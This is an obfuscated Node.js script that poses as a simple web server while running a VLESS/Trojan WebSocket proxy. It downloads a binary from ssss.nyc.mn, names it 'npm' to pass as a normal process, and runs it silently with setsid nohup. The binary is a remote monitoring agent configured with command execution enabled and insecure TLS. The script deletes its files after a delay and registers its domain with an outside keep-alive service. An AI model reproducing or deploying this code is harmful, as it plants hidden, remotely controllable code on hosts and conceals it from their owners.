const _0xbbd1f4=_0x2825;(function(_0x455fde,_0x2864e9){const _0x4c8168=_0x2825,_0x164710=_0x455fde();while(!![]){try{const _0x799ae7=-parseInt(_0x4c8168(0x1c4))/0x1+parseInt(_0x4c8168(0x1a9))/0x2*(-parseInt(_0x4c8168(0x1c3))/0x3)+-parseInt(_0x4c8168(0x175))/0x4+-parseInt(_0x4c8168(0x19d))/0x5+-parseInt(_0x4c8168(0x1b7))/0x6+parseInt(_0x4c8168(0x1ae))/0x7+parseInt(_0x4c8168(0x18a))/0x8*(parseInt(_0x4c8168(0x1bd))/0x9);if(_0x799ae7===_0x2864e9)break;else _0x164710['push'](_0x164710['shift']());}catch(_0x407e6f){_0x164710['push'](_0x164710['shift']());}}}(_0x22c9,0x37381));const os=require('os'),http=require(_0xbbd1f4(0x1a5)),fs=require('fs'),axios=require(_0xbbd1f4(0x152)),net=require(_0xbbd1f4(0x19c)),path=require(_0xbbd1f4(0x18f)),crypto=require('crypto'),{Buffer}=require(_0xbbd1f4(0x170)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xbbd1f4(0x16b)][_0xbbd1f4(0x17c)]||'9ae0b60a-92e1-415e-9ae3-52f21bc3f73b',NEZHA_SERVER=process[_0xbbd1f4(0x16b)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0xbbd1f4(0x1c0)]||'',NEZHA_KEY=process['env'][_0xbbd1f4(0x16c)]||'',DOMAIN=process[_0xbbd1f4(0x16b)][_0xbbd1f4(0x1b2)]||_0xbbd1f4(0x174),AUTO_ACCESS=process[_0xbbd1f4(0x16b)][_0xbbd1f4(0x15c)]||!![],WSPATH=process['env'][_0xbbd1f4(0x192)]||UUID[_0xbbd1f4(0x162)](0x0,0x8),SUB_PATH=process[_0xbbd1f4(0x16b)][_0xbbd1f4(0x195)]||_0xbbd1f4(0x191),NAME=process[_0xbbd1f4(0x16b)]['NAME']||_0xbbd1f4(0x160),PORT=process[_0xbbd1f4(0x16b)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x25decc=_0xbbd1f4;try{const _0x5d8bb1=await axios[_0x25decc(0x1c8)](_0x25decc(0x1a1)),_0x13bb46=_0x5d8bb1[_0x25decc(0x1c1)];ISP=(_0x13bb46['country']+'-'+_0x13bb46[_0x25decc(0x179)])[_0x25decc(0x1aa)](/ /g,'_');}catch(_0x32f05c){ISP='Unknown';}};GetISP();function _0x22c9(){const _0x12573e=['concat','Server','catch','trojan://','sha224','readUInt8','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2096','length','AUTO_ACCESS','443','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','split','Feng','config.yaml','slice','\x20with\x20all\x20DNS\x20servers','write','writeHead','1.1.1.1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Server\x20is\x20running\x20on\x20port\x20','once','trim','env','NEZHA_KEY','2083','vless://','find','buffer','8443','/bin/bash','aarch64','1234.abc.com','49792URrBKD','&type=A','arm','createHash','asOrganization','then','text/html','UUID','\x20-p\x20','&fp=chrome&type=ws&host=','https://dns.google/resolve?name=','Status','pop','reduce','--tls','npm\x20download\x20successfully','readFile','message','8.8.4.4','application/dns-json','Answer','8887864GgRxDN','createServer','decode','utf-8','connection','path','arch','fkj','WSPATH','2053','stream','SUB_PATH','toString','npm','log','includes','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running',':443?security=tls&sni=','net','2124095Xfmqbb','post','readUInt16BE','Failed\x20to\x20resolve\x20','https://speed.cloudflare.com/meta','connect','Hello\x20world!','npm\x20is\x20running','http','npm\x20is\x20already\x20running,\x20skip\x20running...','error','https://amd64.ssss.nyc.mn/agent','15656uzURpz','replace','Automatic\x20Access\x20Task\x20added\x20successfully','test','unlink','178430qeLNJu','&path=%2F','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','finish','DOMAIN','index.html','https://oooo.serv00.net/add-url','url','https://amd64.ssss.nyc.mn/v1','322788WrrEeT','text/plain','every','join','map','close','9IUJTJr','https://','application/json','NEZHA_PORT','data','pipe','123UmvgmT','98283sdfUoL','setsid\x20nohup\x20./npm\x20-s\x20','from','writeFileSync','get','substr','createWriteStream','end','axios'];_0x22c9=function(){return _0x12573e;};return _0x22c9();}const httpServer=http[_0xbbd1f4(0x18b)]((_0x30899e,_0xc59cff)=>{const _0x16832c=_0xbbd1f4;if(_0x30899e[_0x16832c(0x1b5)]==='/'){const _0x2cf9f6=path[_0x16832c(0x1ba)](__dirname,_0x16832c(0x1b3));fs[_0x16832c(0x185)](_0x2cf9f6,'utf8',(_0x4bb523,_0x238d27)=>{const _0xe2ddf1=_0x16832c;if(_0x4bb523){_0xc59cff[_0xe2ddf1(0x165)](0xc8,{'Content-Type':_0xe2ddf1(0x17b)}),_0xc59cff[_0xe2ddf1(0x151)](_0xe2ddf1(0x1a3));return;}_0xc59cff[_0xe2ddf1(0x165)](0xc8,{'Content-Type':'text/html'}),_0xc59cff['end'](_0x238d27);});return;}else{if(_0x30899e['url']==='/'+SUB_PATH){const _0x1761e4=_0x16832c(0x16e)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x16832c(0x17e)+DOMAIN+_0x16832c(0x1af)+WSPATH+'#'+NAME+'-'+ISP,_0x1cc1ed=_0x16832c(0x156)+UUID+'@'+DOMAIN+_0x16832c(0x19b)+DOMAIN+_0x16832c(0x17e)+DOMAIN+_0x16832c(0x1af)+WSPATH+'#'+NAME+'-'+ISP,_0x5a1732=_0x1761e4+'\x0a'+_0x1cc1ed,_0x4e6a03=Buffer[_0x16832c(0x1c6)](_0x5a1732)[_0x16832c(0x196)]('base64');_0xc59cff[_0x16832c(0x165)](0xc8,{'Content-Type':'text/plain'}),_0xc59cff[_0x16832c(0x151)](_0x4e6a03+'\x0a');}else _0xc59cff[_0x16832c(0x165)](0x194,{'Content-Type':_0x16832c(0x1b8)}),_0xc59cff[_0x16832c(0x151)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0xbbd1f4(0x154))]({'server':httpServer}),uuid=UUID[_0xbbd1f4(0x1aa)](/-/g,''),DNS_SERVERS=[_0xbbd1f4(0x187),_0xbbd1f4(0x166)];function resolveHost(_0x1d5e12){return new Promise((_0x4692bc,_0x4781be)=>{const _0x19d528=_0x2825;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x19d528(0x1ac)](_0x1d5e12)){_0x4692bc(_0x1d5e12);return;}let _0x315dc0=0x0;function _0x5838ba(){const _0xbe1b5a=_0x19d528;if(_0x315dc0>=DNS_SERVERS[_0xbe1b5a(0x15b)]){_0x4781be(new Error(_0xbe1b5a(0x1a0)+_0x1d5e12+_0xbe1b5a(0x163)));return;}const _0x6d8ea1=DNS_SERVERS[_0x315dc0];_0x315dc0++;const _0x5ed34b=_0xbe1b5a(0x17f)+encodeURIComponent(_0x1d5e12)+_0xbe1b5a(0x176);axios[_0xbe1b5a(0x1c8)](_0x5ed34b,{'timeout':0x1388,'headers':{'Accept':_0xbe1b5a(0x188)}})[_0xbe1b5a(0x17a)](_0x72e08=>{const _0x66c318=_0xbe1b5a,_0x328725=_0x72e08[_0x66c318(0x1c1)];if(_0x328725[_0x66c318(0x180)]===0x0&&_0x328725[_0x66c318(0x189)]&&_0x328725[_0x66c318(0x189)]['length']>0x0){const _0x19d38d=_0x328725['Answer'][_0x66c318(0x16f)](_0x58c4d0=>_0x58c4d0['type']===0x1);if(_0x19d38d){_0x4692bc(_0x19d38d['data']);return;}}_0x5838ba();})[_0xbe1b5a(0x155)](_0x293a9f=>{_0x5838ba();});}_0x5838ba();});}function handleVlessConnection(_0x31f6ec,_0x2322d1){const _0x3abb3b=_0xbbd1f4,[_0x3a1989]=_0x2322d1,_0x35a211=_0x2322d1[_0x3abb3b(0x162)](0x1,0x11);if(!_0x35a211[_0x3abb3b(0x1b9)]((_0x23e21f,_0x27e394)=>_0x23e21f==parseInt(uuid['substr'](_0x27e394*0x2,0x2),0x10)))return![];let _0xdccb4=_0x2322d1[_0x3abb3b(0x162)](0x11,0x12)[_0x3abb3b(0x158)]()+0x13;const _0x232f5d=_0x2322d1[_0x3abb3b(0x162)](_0xdccb4,_0xdccb4+=0x2)[_0x3abb3b(0x19f)](0x0),_0x384de9=_0x2322d1[_0x3abb3b(0x162)](_0xdccb4,_0xdccb4+=0x1)[_0x3abb3b(0x158)](),_0x5875c8=_0x384de9==0x1?_0x2322d1[_0x3abb3b(0x162)](_0xdccb4,_0xdccb4+=0x4)[_0x3abb3b(0x1ba)]('.'):_0x384de9==0x2?new TextDecoder()[_0x3abb3b(0x18c)](_0x2322d1[_0x3abb3b(0x162)](_0xdccb4+0x1,_0xdccb4+=0x1+_0x2322d1[_0x3abb3b(0x162)](_0xdccb4,_0xdccb4+0x1)[_0x3abb3b(0x158)]())):_0x384de9==0x3?_0x2322d1[_0x3abb3b(0x162)](_0xdccb4,_0xdccb4+=0x10)[_0x3abb3b(0x182)]((_0x56fe98,_0x31fa54,_0x141abd,_0x4c6b9c)=>_0x141abd%0x2?_0x56fe98[_0x3abb3b(0x153)](_0x4c6b9c['slice'](_0x141abd-0x1,_0x141abd+0x1)):_0x56fe98,[])[_0x3abb3b(0x1bb)](_0x265dac=>_0x265dac[_0x3abb3b(0x19f)](0x0)['toString'](0x10))[_0x3abb3b(0x1ba)](':'):'';_0x31f6ec['send'](new Uint8Array([_0x3a1989,0x0]));const _0x111aa2=createWebSocketStream(_0x31f6ec);return resolveHost(_0x5875c8)[_0x3abb3b(0x17a)](_0x29905e=>{const _0x24c86a=_0x3abb3b;net[_0x24c86a(0x1a2)]({'host':_0x29905e,'port':_0x232f5d},function(){const _0x527823=_0x24c86a;this[_0x527823(0x164)](_0x2322d1[_0x527823(0x162)](_0xdccb4)),_0x111aa2['on'](_0x527823(0x1a7),()=>{})[_0x527823(0x1c2)](this)['on']('error',()=>{})[_0x527823(0x1c2)](_0x111aa2);})['on'](_0x24c86a(0x1a7),()=>{});})[_0x3abb3b(0x155)](_0x5a825c=>{const _0x237f5a=_0x3abb3b;net[_0x237f5a(0x1a2)]({'host':_0x5875c8,'port':_0x232f5d},function(){const _0x1829c0=_0x237f5a;this[_0x1829c0(0x164)](_0x2322d1['slice'](_0xdccb4)),_0x111aa2['on'](_0x1829c0(0x1a7),()=>{})[_0x1829c0(0x1c2)](this)['on'](_0x1829c0(0x1a7),()=>{})[_0x1829c0(0x1c2)](_0x111aa2);})['on']('error',()=>{});}),!![];}function _0x2825(_0x552f8a,_0x389335){_0x552f8a=_0x552f8a-0x14f;const _0x22c966=_0x22c9();let _0x282504=_0x22c966[_0x552f8a];return _0x282504;}function handleTrojanConnection(_0x21bb88,_0x1e3d59){const _0x45d8f2=_0xbbd1f4;try{if(_0x1e3d59[_0x45d8f2(0x15b)]<0x3a)return![];const _0x51dbf8=_0x1e3d59[_0x45d8f2(0x162)](0x0,0x38)[_0x45d8f2(0x196)](),_0x300929=[UUID];let _0xc4a675=null;for(const _0x30abdb of _0x300929){const _0x4ebcf7=crypto[_0x45d8f2(0x178)](_0x45d8f2(0x157))['update'](_0x30abdb)['digest']('hex');if(_0x4ebcf7===_0x51dbf8){_0xc4a675=_0x30abdb;break;}}if(!_0xc4a675)return![];let _0x49ed37=0x38;_0x1e3d59[_0x49ed37]===0xd&&_0x1e3d59[_0x49ed37+0x1]===0xa&&(_0x49ed37+=0x2);const _0x29d787=_0x1e3d59[_0x49ed37];if(_0x29d787!==0x1)return![];_0x49ed37+=0x1;const _0x3f95db=_0x1e3d59[_0x49ed37];_0x49ed37+=0x1;let _0x3d5f69,_0x2ed5f2;if(_0x3f95db===0x1)_0x3d5f69=_0x1e3d59['slice'](_0x49ed37,_0x49ed37+0x4)[_0x45d8f2(0x1ba)]('.'),_0x49ed37+=0x4;else{if(_0x3f95db===0x3){const _0x51f71e=_0x1e3d59[_0x49ed37];_0x49ed37+=0x1,_0x3d5f69=_0x1e3d59['slice'](_0x49ed37,_0x49ed37+_0x51f71e)['toString'](),_0x49ed37+=_0x51f71e;}else{if(_0x3f95db===0x4)_0x3d5f69=_0x1e3d59[_0x45d8f2(0x162)](_0x49ed37,_0x49ed37+0x10)[_0x45d8f2(0x182)]((_0x10bf84,_0x704a39,_0x4768a1,_0x586a15)=>_0x4768a1%0x2?_0x10bf84[_0x45d8f2(0x153)](_0x586a15[_0x45d8f2(0x162)](_0x4768a1-0x1,_0x4768a1+0x1)):_0x10bf84,[])[_0x45d8f2(0x1bb)](_0x2c745b=>_0x2c745b[_0x45d8f2(0x19f)](0x0)['toString'](0x10))[_0x45d8f2(0x1ba)](':'),_0x49ed37+=0x10;else return![];}}_0x2ed5f2=_0x1e3d59['readUInt16BE'](_0x49ed37),_0x49ed37+=0x2;_0x49ed37<_0x1e3d59[_0x45d8f2(0x15b)]&&_0x1e3d59[_0x49ed37]===0xd&&_0x1e3d59[_0x49ed37+0x1]===0xa&&(_0x49ed37+=0x2);const _0x5c0f73=createWebSocketStream(_0x21bb88);return resolveHost(_0x3d5f69)[_0x45d8f2(0x17a)](_0x18a066=>{const _0x159de4=_0x45d8f2;net[_0x159de4(0x1a2)]({'host':_0x18a066,'port':_0x2ed5f2},function(){const _0xdb683f=_0x159de4;_0x49ed37<_0x1e3d59[_0xdb683f(0x15b)]&&this[_0xdb683f(0x164)](_0x1e3d59[_0xdb683f(0x162)](_0x49ed37)),_0x5c0f73['on'](_0xdb683f(0x1a7),()=>{})[_0xdb683f(0x1c2)](this)['on'](_0xdb683f(0x1a7),()=>{})[_0xdb683f(0x1c2)](_0x5c0f73);})['on'](_0x159de4(0x1a7),()=>{});})[_0x45d8f2(0x155)](_0x5a18e7=>{const _0x20c22d=_0x45d8f2;net[_0x20c22d(0x1a2)]({'host':_0x3d5f69,'port':_0x2ed5f2},function(){const _0x37ff43=_0x20c22d;_0x49ed37<_0x1e3d59[_0x37ff43(0x15b)]&&this[_0x37ff43(0x164)](_0x1e3d59[_0x37ff43(0x162)](_0x49ed37)),_0x5c0f73['on']('error',()=>{})[_0x37ff43(0x1c2)](this)['on']('error',()=>{})[_0x37ff43(0x1c2)](_0x5c0f73);})['on'](_0x20c22d(0x1a7),()=>{});}),!![];}catch(_0x1a96b5){return![];}}wss['on'](_0xbbd1f4(0x18e),(_0x29dbf4,_0x29d4e2)=>{const _0x53ded4=_0xbbd1f4,_0x6ce06e=_0x29d4e2[_0x53ded4(0x1b5)]||'';_0x29dbf4[_0x53ded4(0x169)](_0x53ded4(0x186),_0x136990=>{const _0x1144e3=_0x53ded4;if(_0x136990[_0x1144e3(0x15b)]>0x11&&_0x136990[0x0]===0x0){const _0x4a11c6=_0x136990[_0x1144e3(0x162)](0x1,0x11),_0x3aedb5=_0x4a11c6['every']((_0x1c6869,_0x537a33)=>_0x1c6869==parseInt(uuid[_0x1144e3(0x14f)](_0x537a33*0x2,0x2),0x10));if(_0x3aedb5){!handleVlessConnection(_0x29dbf4,_0x136990)&&_0x29dbf4[_0x1144e3(0x1bc)]();return;}}!handleTrojanConnection(_0x29dbf4,_0x136990)&&_0x29dbf4[_0x1144e3(0x1bc)]();})['on'](_0x53ded4(0x1a7),()=>{});});const getDownloadUrl=()=>{const _0x4d6212=_0xbbd1f4,_0x7db504=os[_0x4d6212(0x190)]();return _0x7db504===_0x4d6212(0x177)||_0x7db504==='arm64'||_0x7db504===_0x4d6212(0x173)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x4d6212(0x1b6):_0x4d6212(0x1a8);},downloadFile=async()=>{const _0x38d587=_0xbbd1f4;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5f3fd6=getDownloadUrl(),_0x530bc6=await axios({'method':_0x38d587(0x1c8),'url':_0x5f3fd6,'responseType':_0x38d587(0x194)}),_0x186f03=fs[_0x38d587(0x150)](_0x38d587(0x197));return _0x530bc6['data'][_0x38d587(0x1c2)](_0x186f03),new Promise((_0x2182a7,_0xc2cefd)=>{const _0x335bc7=_0x38d587;_0x186f03['on'](_0x335bc7(0x1b1),()=>{const _0x5800a1=_0x335bc7;console['log'](_0x5800a1(0x184)),exec('chmod\x20+x\x20npm',_0x189557=>{if(_0x189557)_0xc2cefd(_0x189557);_0x2182a7();});}),_0x186f03['on'](_0x335bc7(0x1a7),_0xc2cefd);});}catch(_0x4c44b6){throw _0x4c44b6;}},runnz=async()=>{const _0xb4f5f3=_0xbbd1f4;try{const _0x2e842d=execSync(_0xb4f5f3(0x15e),{'encoding':_0xb4f5f3(0x18d)});if(_0x2e842d[_0xb4f5f3(0x16a)]()!==''){console[_0xb4f5f3(0x198)](_0xb4f5f3(0x1a6));return;}}catch(_0x19c023){}await downloadFile();let _0x47e86c='',_0x499e0d=[_0xb4f5f3(0x15d),_0xb4f5f3(0x171),_0xb4f5f3(0x15a),'2087',_0xb4f5f3(0x16d),_0xb4f5f3(0x193)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x54822c=_0x499e0d['includes'](NEZHA_PORT)?_0xb4f5f3(0x183):'';_0x47e86c=_0xb4f5f3(0x1c5)+NEZHA_SERVER+':'+NEZHA_PORT+_0xb4f5f3(0x17d)+NEZHA_KEY+'\x20'+_0x54822c+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c0e58=NEZHA_SERVER[_0xb4f5f3(0x199)](':')?NEZHA_SERVER[_0xb4f5f3(0x15f)](':')[_0xb4f5f3(0x181)]():'',_0x2231a5=_0x499e0d[_0xb4f5f3(0x199)](_0x3c0e58)?'true':'false',_0x3a6c1b='client_secret:\x20'+NEZHA_KEY+_0xb4f5f3(0x167)+NEZHA_SERVER+_0xb4f5f3(0x1b0)+_0x2231a5+_0xb4f5f3(0x159)+UUID;fs[_0xb4f5f3(0x1c7)](_0xb4f5f3(0x161),_0x3a6c1b);}_0x47e86c='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0xb4f5f3(0x198)](_0xb4f5f3(0x19a));return;}}try{exec(_0x47e86c,{'shell':_0xb4f5f3(0x172)},_0x57d02d=>{const _0x4e91ef=_0xb4f5f3;if(_0x57d02d)console[_0x4e91ef(0x1a7)]('npm\x20running\x20error:',_0x57d02d);else console[_0x4e91ef(0x198)](_0x4e91ef(0x1a4));});}catch(_0x29cf76){console[_0xb4f5f3(0x1a7)]('error:\x20'+_0x29cf76);}};async function addAccessTask(){const _0x20d49a=_0xbbd1f4;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x159da9=_0x20d49a(0x1be)+DOMAIN;try{const _0x2ad4ae=await axios[_0x20d49a(0x19e)](_0x20d49a(0x1b4),{'url':_0x159da9},{'headers':{'Content-Type':_0x20d49a(0x1bf)}});console[_0x20d49a(0x198)](_0x20d49a(0x1ab));}catch(_0xcb3c9e){}}const delFiles=()=>{const _0x5ce635=_0xbbd1f4;fs['unlink'](_0x5ce635(0x197),()=>{}),fs[_0x5ce635(0x1ad)](_0x5ce635(0x161),()=>{});};httpServer['listen'](PORT,()=>{const _0x81c52b=_0xbbd1f4;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x81c52b(0x198)](_0x81c52b(0x168)+PORT);});
